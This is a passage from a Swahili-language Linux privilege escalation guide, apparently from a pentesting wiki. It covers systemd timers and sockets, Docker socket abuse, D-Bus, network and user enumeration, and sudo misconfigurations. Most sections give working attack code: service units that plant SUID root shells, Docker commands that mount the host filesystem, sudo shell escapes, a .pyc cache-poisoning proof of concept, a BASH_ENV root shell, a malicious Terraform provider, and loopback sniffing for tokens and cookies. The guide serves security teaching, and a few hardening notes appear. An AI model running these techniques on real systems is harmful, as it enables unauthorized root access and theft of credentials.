Kisha, unda **executable** yenye **jina sawa na binary ya relative path** ndani ya folda ya systemd PATH ambayo unaweza kuandikia, na service inapoombwa kutekeleza kitendo chenye vulnerability (**Start**, **Stop**, **Reload**), **backdoor** yako itatekelezwa (watumiaji wasio na privileged access kwa kawaida hawawezi kuanzisha/kusimamisha services, lakini angalia ikiwa unaweza kutumia `sudo -l`).

**Jifunze zaidi kuhusu services kwa kutumia `man systemd.service`.**

## **Timers**

**Timers** ni systemd unit files ambazo majina yake huishia na `**.timer**` na hudhibiti files za `**.service**` au events. **Timers** zinaweza kutumika kama mbadala wa cron kwa kuwa zina support iliyojengwa ndani kwa calendar time events na monotonic time events, na zinaweza kuendeshwa asynchronously.

Unaweza kuorodhesha timers zote kwa kutumia:
```bash
systemctl list-timers --all
```
### Timers zinazoweza kuandikwa

Ikiwa unaweza kurekebisha timer, unaweza kuifanya itekeleze baadhi ya systemd.unit zilizopo (kama `.service` au `.target`)
```bash
Unit=backdoor.service
```
Katika nyaraka unaweza kusoma Unit ni nini:

> Unit ya kuamilisha timer hii inapotimia. Hoja ni jina la unit, ambalo kiambishi chake si ".timer". Lisipobainishwa, thamani hii huwa service yenye jina sawa na unit ya timer, isipokuwa kiambishi. (Tazama hapo juu.) Inapendekezwa kwamba jina la unit inayoamilishwa na jina la unit ya timer liwe sawa, isipokuwa kiambishi.

Kwa hivyo, ili kutumia vibaya ruhusa hii utahitaji:

- Kupata systemd unit fulani (kama `.service`) ambayo **inaendesha binary inayoweza kuandikwa**
- Kupata systemd unit inayotekeleza **relative path** na una **ruhusa za kuandika** kwenye **systemd PATH** (ili kuiga executable hiyo)

**Jifunze zaidi kuhusu timers kwa kutumia `man systemd.timer`.**

### **Kuwasha Timer**

Ili kuwasha timer unahitaji root privileges na kutekeleza:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Kumbuka **timer** huwashwa kwa kuunda symlink kwake kwenye `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) huwezesha **mawasiliano ya process** kwenye mashine hiyo hiyo au mashine tofauti ndani ya client-server models. Hutumia descriptor files za kawaida za Unix kwa mawasiliano kati ya kompyuta na husanidiwa kupitia `.socket` files.<sup>[[14]](#references)</sup>

Sockets zinaweza kusanidiwa kwa kutumia `.socket` files.

**Jifunze zaidi kuhusu sockets kwa `man systemd.socket`.** Ndani ya file hili, parameters kadhaa za kuvutia zinaweza kusanidiwa:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Options hizi ni tofauti, lakini muhtasari wake hutumika **kuonyesha mahali itakaposikiliza** socket (path ya AF_UNIX socket file, IPv4/6 na/au port number ya kusikiliza, n.k.)
- `Accept`: Huchukua boolean argument. Ikiwa ni **true**, **service instance huanzishwa kwa kila incoming connection** na connection socket pekee ndiyo hupitishwa kwake. Ikiwa ni **false**, listening sockets zote zenyewe **hupitishwa kwa started service unit**, na service unit moja pekee huanzishwa kwa connections zote. Thamani hii hupuuzwa kwa datagram sockets na FIFOs ambapo service unit moja hushughulikia traffic yote inayoingia bila masharti. **Default ni false**. Kwa sababu za performance, inapendekezwa kuandika daemons mpya kwa njia inayofaa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Huchukua command lines moja au zaidi, ambazo **hutekelezwa kabla** au **baada** ya listening **sockets**/FIFOs **kuundwa** na ku-bindiwa, mtawalia. Token ya kwanza ya command line lazima iwe absolute filename, ikifuatiwa na arguments za process.
- `ExecStopPre`, `ExecStopPost`: **Commands** za ziada ambazo **hutekelezwa kabla** au **baada** ya listening **sockets**/FIFOs **kufungwa** na kuondolewa, mtawalia.
- `Service`: Hubainisha jina la **service** unit **ya kuwashwa** wakati wa **incoming traffic**. Setting hii inaruhusiwa tu kwa sockets zilizo na Accept=no. Kwa default, hutumia service yenye jina linalofanana na socket (suffix ikiwa imebadilishwa). Katika hali nyingi, haipaswi kuwa muhimu kutumia option hii.

### Writable .socket files

Ukipata `.socket` file iliyo **writable**, unaweza **kuongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama: `ExecStartPre=/home/kali/sys/backdoor`, na backdoor itatekelezwa kabla ya socket kuundwa. Kwa hiyo, **huenda ukahitaji kusubiri hadi mashine i-reboot.**\
_Kumbuka kuwa mfumo lazima uwe unatumia socket file configuration hiyo; la sivyo backdoor haitatekelezwa_

### Socket activation + writable unit path (create missing service)

Mkengeuko mwingine wenye athari kubwa ni:

- socket unit yenye `Accept=no` na `Service=<name>.service`
- service unit inayorejelewa haipo
- attacker anaweza kuandika ndani ya `/etc/systemd/system` (au unit search path nyingine)

Katika hali hiyo, attacker anaweza kuunda `<name>.service`, kisha ku-trigger traffic kwenda kwenye socket ili systemd ipakie na kutekeleza service mpya kama root.

Mtiririko wa haraka:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Sockets zinazoweza kuandikwa

Ikiwa **utatambua socket yoyote inayoweza kuandikwa** (_hapa tunazungumzia Unix Sockets na si faili za config za `.socket`_), basi **unaweza kuwasiliana** na socket hiyo na pengine kutumia vulnerability.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Muunganisho ghafi
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Mfano wa exploitation:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP sockets

Kumbuka kwamba huenda kukawa na baadhi ya **sockets zinazosikiliza** maombi ya HTTP (_sizungumzii faili za .socket bali faili zinazofanya kazi kama unix sockets_). Unaweza kuangalia hili kwa:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Ikiwa socket **itajibu kwa ombi la HTTP**, basi unaweza **kuwasiliana** nayo na labda **kutumia vulnerability fulani**.

### Writable Docker Socket

Socket ya Docker, ambayo mara nyingi hupatikana kwenye `/var/run/docker.sock`, ni faili muhimu inayopaswa kulindwa. Kwa chaguo-msingi, inaweza kuandikwa na mtumiaji wa `root` na wanachama wa kundi la `docker`. Kuwa na ruhusa ya kuandika kwenye socket hii kunaweza kusababisha privilege escalation. Hapa kuna maelezo ya jinsi hili linavyoweza kufanywa na mbinu mbadala ikiwa Docker CLI haipatikani.

#### **Privilege Escalation with Docker CLI**

Ikiwa una ruhusa ya kuandika kwenye socket ya Docker, unaweza kufanya privilege escalation kwa kutumia amri zifuatazo:<sup>[[15]](#references)</sup>
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Amri hizi zinakuruhusu kuendesha container yenye access ya kiwango cha root kwenye file system ya host.

#### **Kutumia Docker API Moja kwa Moja**

Katika hali ambapo Docker CLI haipatikani, Docker socket bado inaweza kutumiwa vibaya kwa kutumia raw HTTP kupitia Unix socket. Mtiririko unaotegemewa zaidi ni:

- tengeneza helper container ya muda mrefu yenye host root iliyowekwa kama bind mount
- ianzishe
- tengeneza `exec` instance ndani ya helper hiyo
- anzisha `exec` instance na usome output kupitia API

**Orodhesha Docker images**
```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```
**Unda na uanze container ya msaidizi**
```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
"http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
-X POST "http://localhost/v1.47/containers/${HELPER}/start"
```
**Unda instance ya exec**
```bash
EXEC_ID=$(
curl -s --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
"http://localhost/v1.47/containers/${HELPER}/exec" \
| tr -d '\n' \
| sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```
**Anzisha instance ya exec na usome output**
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Detach":false,"Tty":true}' \
"http://localhost/v1.47/exec/${EXEC_ID}/start"
```
Pattern hii kwa kawaida huwa thabiti zaidi kuliko kujaribu kuendesha `attach` mwenyewe kwa kutumia `socat` au `nc -U`. Mara tu unapoweza kuunda helper yenye `/:/host`, unaweza kutumia instances za ziada za `exec` kusoma files kama vile `/host/root/...`, kuongeza SSH keys chini ya `/host/root/.ssh`, au kurekebisha host startup files.

### Nyingine

Kumbuka kwamba ikiwa una write permissions kwenye docker socket kwa sababu uko **ndani ya group `docker`**, una [**njia zaidi za ku-escalate privileges**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Ikiwa [**docker API inasikiliza kwenye port**](../../../network-services-pentesting/2375-pentesting-docker.md#compromising), unaweza pia ku-compromise.

Angalia **njia zaidi za kutoka kwenye containers au kutumia vibaya container runtimes ili ku-escalate privileges** katika:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Ukipata kwamba unaweza kutumia command ya **`ctr`**, soma ukurasa ufuatao kwa kuwa **huenda ukaweza kuitumia vibaya ili ku-escalate privileges**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Ukipata kwamba unaweza kutumia command ya **`runc`**, soma ukurasa ufuatao kwa kuwa **huenda ukaweza kuitumia vibaya ili ku-escalate privileges**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ni **inter-Process Communication (IPC) system** ya hali ya juu inayowezesha applications kuwasiliana na kushiriki data kwa ufanisi. Ikiwa imeundwa kwa kuzingatia modern Linux system, inatoa framework thabiti kwa aina mbalimbali za communication kati ya applications.<sup>[[16]](#references)</sup>

System hii inaweza kutumika kwa njia mbalimbali, ikiwa inasaidia basic IPC inayoboresha ubadilishanaji wa data kati ya processes, sawa na **enhanced UNIX domain sockets**. Pia husaidia kutangaza events au signals, na kuwezesha integration rahisi kati ya system components. Kwa mfano, signal kutoka kwa Bluetooth daemon kuhusu incoming call inaweza kuufanya music player uzime sauti, hivyo kuboresha user experience. Zaidi ya hayo, D-Bus inasaidia remote object system, inayorahisisha service requests na method invocations kati ya applications, na kurahisisha processes ambazo awali zilikuwa changamano.

D-Bus hutumia **allow/deny model**, ikidhibiti message permissions (method calls, signal emissions, n.k.) kulingana na athari ya jumla ya policy rules zinazoendana. Policies hizi hubainisha interactions na bus, na zinaweza kuruhusu privilege escalation kupitia exploitation ya permissions hizi.

Mfano wa policy kama hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` umetolewa, ukieleza permissions za root user kumiliki, kutuma messages kwa, na kupokea messages kutoka kwa `fi.w1.wpa_supplicant1`.

Policies ambazo hazijabainisha user au group hutumika kwa wote, huku policies za "default" context zikitumika kwa zile zote ambazo hazijashughulikiwa na policies nyingine maalum.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Jifunze jinsi ya kufanya enumeration na kutumia vibaya mawasiliano ya D-Bus hapa:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mtandao**

Daima inavutia kufanya enumeration ya mtandao na kubaini nafasi ya mashine.

### Enumeration ya jumla
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Uchunguzi wa haraka wa outbound filtering

Ikiwa host inaweza kuendesha commands lakini callbacks zinashindwa, bainisha kwa haraka ikiwa tatizo ni DNS, transport, proxy, au route filtering:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Porti zilizo wazi

Kila mara kagua huduma za mtandao zinazoendeshwa kwenye mashine ambazo hukuwa na uwezo wa kuwasiliana nazo kabla ya kuifikia:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Classify listeners by bind target:

- `0.0.0.0` / `[::]`: zimewekwa wazi kwenye interfaces zote za ndani.
- `127.0.0.1` / `::1`: za ndani pekee (zinafaa kwa tunnel/forward).
- Anwani maalum za IP za ndani (k.m. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): kwa kawaida zinafikiwa tu kutoka kwenye segments za ndani.

### Workflow ya triage ya service za ndani pekee

Unapopata udhibiti wa host, services zinazofungamana na `127.0.0.1` mara nyingi zinaanza kufikiwa kwa mara ya kwanza kutoka kwenye shell yako. Workflow ya haraka ya ndani ni:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS kama network scanner (network-only mode)

Mbali na ukaguzi wa local PE, linPEAS inaweza kufanya kazi kama network scanner iliyolenga. Inatumia binaries zinazopatikana kwenye `$PATH` (kwa kawaida `fping`, `ping`, `nc`, `ncat`) na haisakinishi tooling.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Ukipitisha `-d`, `-p`, au `-i` bila `-t`, linPEAS hufanya kazi kama network scanner safi (ikikwepa ukaguzi mwingine wa privilege escalation).

### Sniffing

Angalia ikiwa unaweza kunusa traffic. Ikiwa unaweza, huenda ukaweza kupata credentials.
```
timeout 1 tcpdump
```
Ukaguzi wa haraka wa vitendo:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) ina thamani hasa katika post-exploitation kwa sababu huduma nyingi za ndani pekee hufichua tokens/cookies/credentials humo:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Kusanya sasa, changanua baadaye:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Watumiaji

### Uhesabuji wa Jumla

Kagua **who** wewe ni, una **privileges** zipi, ni **users** gani walio kwenye mifumo, ni akina nani wanaoweza **login**, na ni akina nani walio na **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Baadhi ya versions za Linux ziliathiriwa na bug inayowawezesha users walio na **UID > INT_MAX** kufanya privilege escalation. Maelezo zaidi: [hapa](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [hapa](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) na [hapa](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Exploit it** kwa kutumia: **`systemd-run -t /bin/bash`**

### Vikundi

Angalia ikiwa wewe ni **member wa group fulani** inayoweza kukupa root privileges:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Angalia ikiwa kuna kitu chochote cha kuvutia kilichopo ndani ya clipboard (ikiwezekana)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Sera ya Nenosiri
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Nywila zinazojulikana

Ikiwa **unajua nywila yoyote** ya mazingira, **jaribu kuingia kama kila mtumiaji** ukitumia nywila hiyo.

### Su Brute

Ikiwa hujali kusababisha kelele nyingi na binary za `su` na `timeout` zinapatikana kwenye kompyuta, unaweza kujaribu kufanya brute-force kwa mtumiaji ukitumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) yenye parameter ya `-a` pia hujaribu kufanya brute-force kwa watumiaji.

## Matumizi mabaya ya PATH inayoweza kuandikwa

### $PATH

Ukigundua kuwa unaweza **kuandika ndani ya folda fulani ya $PATH**, unaweza kuweza kuongeza privileges kwa **kuunda backdoor ndani ya folda inayoweza kuandikwa** kwa kutumia jina la command fulani ambayo itatekelezwa na mtumiaji mwingine (ikiwezekana root), na ambayo **haipakuliwi kutoka kwenye folda iliyo kabla** ya folda yako inayoweza kuandikwa katika $PATH.

### SUDO na SUID

Unaweza kuruhusiwa kutekeleza command fulani kwa kutumia sudo, au command hizo zinaweza kuwa na SUID bit. Ikague kwa kutumia:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Baadhi ya **amri zisizotarajiwa hukuruhusu kusoma na/au kuandika faili au hata kutekeleza amri**.<sup>[[8]](#references)</sup> Kwa mfano:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Usanidi wa Sudo unaweza kumruhusu mtumiaji kutekeleza command fulani kwa privileges za mtumiaji mwingine bila kujua password.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Katika mfano huu mtumiaji `demo` anaweza kuendesha `vim` kama `root`, kwa hiyo sasa ni rahisi kupata shell kwa kuongeza ssh key kwenye saraka ya root au kwa kuita `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Maagizo haya humruhusu mtumiaji **kuweka variable ya mazingira** wakati wa kutekeleza kitu:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Mfano huu, **uliotokana na mashine ya HTB Admirer**, ulikuwa **dhaifu** kwa **PYTHONPATH hijacking** ili kupakia library ya python ya kiholela wakati wa kutekeleza script kama root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Uwekaji sumu wa `__pycache__` / `.pyc` unaoweza kuandikwa katika imports za Python zinazoruhusiwa na sudo

Ikiwa **Python script inayoruhusiwa na sudo** ina-import module ambayo package directory yake ina **`__pycache__` inayoweza kuandikwa**, unaweza kubadilisha `.pyc` iliyohifadhiwa na kupata code execution kama mtumiaji mwenye privileged kwenye import inayofuata.<sup>[[30]](#references)</sup>

- Kwa nini inafanya kazi:
- CPython huhifadhi bytecode caches katika `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
- Interpreter huthibitisha **header** (magic + timestamp/hash metadata inayohusishwa na source), kisha hutekeleza marshaled code object iliyohifadhiwa baada ya header hiyo.
- Ikiwa unaweza **kufuta na kuunda upya** file iliyohifadhiwa kwa sababu directory inaweza kuandikwa, `.pyc` inayomilikiwa na root lakini isiyoweza kuandikwa bado inaweza kubadilishwa.
- Njia ya kawaida:
- `sudo -l` huonyesha Python script au wrapper unayoweza kuendesha kama root.
- Script hiyo ina-import local module kutoka `/opt/app/`, `/usr/local/lib/...`, n.k.
- Directory ya `__pycache__` ya module iliyo-importiwa inaweza kuandikwa na user wako au na kila mtu.

Enumeration ya haraka:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Ikiwa unaweza kukagua script yenye privileges, tambua modules zilizoingizwa na cache path yake:<sup>[[32]](#references)</sup>
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Mtiririko wa abuse:

1. Endesha script iliyoruhusiwa na sudo mara moja ili Python itengeneze faili halali ya cache ikiwa bado haipo.
2. Soma bytes 16 za kwanza kutoka kwenye `.pyc` halali na uzitumie tena kwenye faili yenye poisoning.
3. Compile payload code object, `marshal.dumps(...)` hiyo, futa faili ya awali ya cache, kisha itengeneze tena kwa header ya awali pamoja na bytecode yako malicious.
4. Endesha tena script iliyoruhusiwa na sudo ili import itekeleze payload yako kama root.

Vidokezo muhimu:

- Kutumia tena header ya awali ni muhimu kwa sababu Python hukagua metadata ya cache dhidi ya source file, si kama mwili wa bytecode unaendana kweli na source.
- Hii ni muhimu hasa wakati source file inamilikiwa na root na haiwezi kuandikwa, lakini directory ya `__pycache__` inayoiweka inaweza kuandikwa.
- Attack hushindwa ikiwa privileged process inatumia `PYTHONDONTWRITEBYTECODE=1`, imports zinatoka kwenye location yenye permissions salama, au write access inaondolewa kwenye kila directory iliyo kwenye import path.

Muundo wa chini kabisa wa proof-of-concept:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- Hakikisha hakuna directory katika privileged Python import path inayoweza kuandikwa na low-privileged users, ikiwemo `__pycache__`.
- Kwa privileged runs, zingatia `PYTHONDONTWRITEBYTECODE=1` na ukaguzi wa mara kwa mara wa `__pycache__` directories zinazoweza kuandikwa bila kutarajiwa.
- Shughulikia writable local Python modules na writable cache directories kwa njia ileile unayotumia kushughulikia writable shell scripts au shared libraries zinazoendeshwa na root.

### BASH_ENV imehifadhiwa kupitia sudo env_keep → root shell

Ikiwa sudoers inahifadhi `BASH_ENV` (kwa mfano, `Defaults env_keep+="ENV BASH_ENV"`), unaweza kutumia non-interactive startup behavior ya Bash kuendesha arbitrary code kama root unapotekeleza command iliyoruhusiwa.<sup>[[24]](#references)</sup>

- Kwa nini inafanya kazi: Kwa non-interactive shells, Bash hutathmini `$BASH_ENV` na kusource hiyo file kabla ya kuendesha target script. Sudo rules nyingi zinaruhusu kuendesha script au shell wrapper. Ikiwa `BASH_ENV` imehifadhiwa na sudo, file yako inasourceiwa ikiwa na root privileges.<sup>[[23]](#references)</sup>

- Mahitaji:
- Sudo rule unayoweza kuendesha (target yoyote inayoita `/bin/bash` non-interactively, au bash script yoyote).
- `BASH_ENV` ipo kwenye `env_keep` (angalia kwa `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Ondoa `BASH_ENV` (na `ENV`) kutoka `env_keep`, pendelea `env_reset`.
- Epuka shell wrappers kwa commands zinazoruhusiwa na sudo; tumia binaries ndogo.
- Zingatia sudo I/O logging na alerting wakati env vars zilizohifadhiwa zinapotumika.

### Terraform via sudo with preserved HOME (!env_reset)

Ikiwa sudo itaacha environment ikiwa kamili (`!env_reset`) huku ikiruhusu `terraform apply`, `$HOME` itabaki ya user anayeita command. Kwa hivyo Terraform hupakia **$HOME/.terraformrc** kama root na kuheshimu `provider_installation.dev_overrides`.<sup>[[25]](#references)</sup>

- Elekeza provider inayohitajika kwenye directory inayoweza kuandikwa na uweke plugin hasidi iliyopewa jina la provider (kwa mfano, `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform itashindwa kwenye Go plugin handshake lakini itatekeleza payload kama root kabla ya kusitisha, na kuacha SUID shell.

### TF_VAR overrides + symlink validation bypass

Terraform variables zinaweza kutolewa kupitia environment variables za `TF_VAR_<name>`, ambazo hubaki wakati sudo inapohifadhi environment. Uthibitishaji dhaifu kama `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` unaweza kuepukwa kwa kutumia symlinks:<sup>[[25]](#references)</sup>
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform hutatua symlink na kunakili `/root/root.txt` halisi hadi kwenye eneo linaloweza kusomwa na attacker. Mbinu hiyo hiyo inaweza kutumiwa **kuandika** kwenye paths zenye privileged access kwa kuunda mapema symlink za destination (kwa mfano, kuelekeza path ya destination ya provider ndani ya `/etc/cron.d/`).

### requiretty / !requiretty

Kwenye baadhi ya distributions za zamani, sudo inaweza kusanidiwa kwa `requiretty`, ambayo hulazimisha sudo iendeshwe kutoka kwenye TTY ya mwingiliano pekee. Ikiwa `!requiretty` imewekwa (au option hiyo haipo), sudo inaweza kutekelezwa kutoka kwenye contexts zisizo za mwingiliano kama reverse shells, cron jobs, au scripts.
```bash
Defaults !requiretty
```
Hii si vulnerability ya moja kwa moja yenyewe, lakini inaongeza hali ambazo sudo rules zinaweza kutumiwa vibaya bila kuhitaji PTY kamili.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Ikiwa `sudo -l` inaonyesha `env_keep+=PATH` au `secure_path` yenye entries zinazoweza kuandikwa na attacker (kwa mfano, `/home/<user>/bin`), command yoyote ya relative ndani ya target iliyoruhusiwa na sudo inaweza kufunikwa.<sup>[[3]](#references)</sup>

